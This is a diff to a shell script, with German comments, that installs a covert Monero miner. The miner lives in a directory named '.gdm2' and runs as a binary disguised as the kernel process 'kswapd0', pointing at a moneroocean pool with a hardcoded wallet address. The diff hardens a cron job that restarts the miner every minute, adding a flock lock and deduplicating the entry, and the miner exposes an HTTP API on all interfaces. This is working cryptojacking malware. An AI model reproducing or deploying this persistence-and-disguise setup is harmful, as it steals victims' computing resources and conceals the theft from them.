@@ -357,16 +357,20 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_backgro
 cat $HOME/.gdm2/config.json
 
 # Cronjob erstellen
-(
-  crontab -l 2>/dev/null
-  echo "* * * * * $HOME/.gdm2/check_and_start.sh"
-) | crontab -
+# Nur einen Cronjob hinzufügen, falls nicht vorhanden
+(crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.gdm2/check_and_start.sh") | crontab -
 
 # Skript für den Cronjob erstellen
 cat <<'EOF' >"$HOME/.gdm2/check_and_start.sh"
- 
+
 #!/bin/bash
-if ! pgrep -f "kswapd0"; then
+lockfile="$HOME/.gdm2/check_and_start.lock"
+
+# Locking-Mechanismus mit flock
+exec 200>"$lockfile"
+flock -n 200 || exit 1
+
+if ! pgrep -f "$HOME/.gdm2/kswapd0"; then
   $HOME/.gdm2/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
 fi
 EOF
